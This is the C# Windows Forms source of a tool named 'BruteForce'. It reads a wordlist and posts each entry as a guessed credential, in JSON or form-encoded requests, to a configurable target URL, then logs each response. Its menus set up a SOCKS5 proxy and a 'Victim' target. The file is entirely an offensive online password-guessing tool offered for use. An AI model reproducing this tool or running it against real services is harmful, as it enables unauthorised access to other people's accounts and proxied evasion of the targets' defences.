using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Windows.Forms;

namespace BruteForce
{
    public partial class Form1 : Form
    {

        private string file;
        public static HttpClientHandler handler;
        public static string url;
        public static string paramName;
        public static string paramValue;
        public static string keyName;
        public static bool isJson;

        public Form1()
        {
            InitializeComponent();
        }

        private void btnAttack_Click(object sender, EventArgs e)
        {
           try
            {

                if (File.Exists(file))
                {
                    string[] lines = File.ReadAllLines(file);
                    foreach (var line in lines)
                    {
                        HttpClient client = null;

                        if (handler != null)
                        {
                             client = new HttpClient(handler: handler, disposeHandler: true);
                        }
                        else
                        {
                            client = new HttpClient();
                        }
                        

                        if (isJson)
                        {
                            var json = "{ \"" + paramName + "\" : \"" + paramValue + "\",  " +
                            " \"" + keyName + "\" : \"" + line + "\"}";
                            var content = new StringContent(json, Encoding.UTF8, "application/json");
                            
                            var r = client.PostAsync(url, content).Result;
                            var c = r.Content.ReadAsStringAsync().Result;
                            addRowToDataGrid(r, c);
                        }
                        else
                        {
                            var content = new FormUrlEncodedContent(new[]
                            {
                                new KeyValuePair<string, string>(paramName, paramValue),
                                new KeyValuePair<string, string>(keyName, line),
                            });

                            var r = client.PostAsync(url, content).Result;
                            var c = r.Content.ReadAsStringAsync().Result;
                            addRowToDataGrid(r, c);
                        }
                    }
                }
            }catch(Exception)
            {
                throw;
            }
        }

        private void addRowToDataGrid(HttpResponseMessage r, string content)
        {
            dataGridView.Rows.Add(r.StatusCode.ToString(), r.Headers, content);
        }

        private void btnSelectFile_Click(object sender, EventArgs e)
        {
            var result = openFileDialog.ShowDialog();
            if (result == DialogResult.OK)
            {
                file = openFileDialog.FileName;
                txtFileName.Text = file;
            }
        }

        private void configToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ConfigSocks5 configSocks5 = new ConfigSocks5();
            configSocks5.ShowDialog();
        }

        private void victimToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Victim victim = new Victim();
            victim.ShowDialog();
        }
    }
}
